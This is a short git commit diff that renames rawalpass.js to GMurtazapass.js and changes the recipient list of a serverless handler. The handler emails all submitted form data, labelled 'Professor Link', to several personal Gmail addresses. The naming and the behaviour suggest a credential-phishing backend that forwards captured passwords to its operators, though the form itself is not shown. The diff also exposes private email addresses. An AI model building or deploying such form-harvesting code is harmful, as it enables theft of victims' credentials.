43181b2915686d6f3d4a9b186bd7215a903f5694
linkquarry-hub <linkquarry@gmail.com>
2025-11-24 13:05:51 +0500

    Update and rename rawalpass.js to GMurtazapass.js

--- GMurtazapass.js
+++ GMurtazapass.js
@@ -37,7 +37,7 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "linkquarry@gmail.com,fahadali123gg@gmail.com,rwlrathor@gmail.com",
+      to: "linkquarry@gmail.com,fahadali123gg@gmail.com,gmm7300@gmail.com",
       subject: "rawal",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
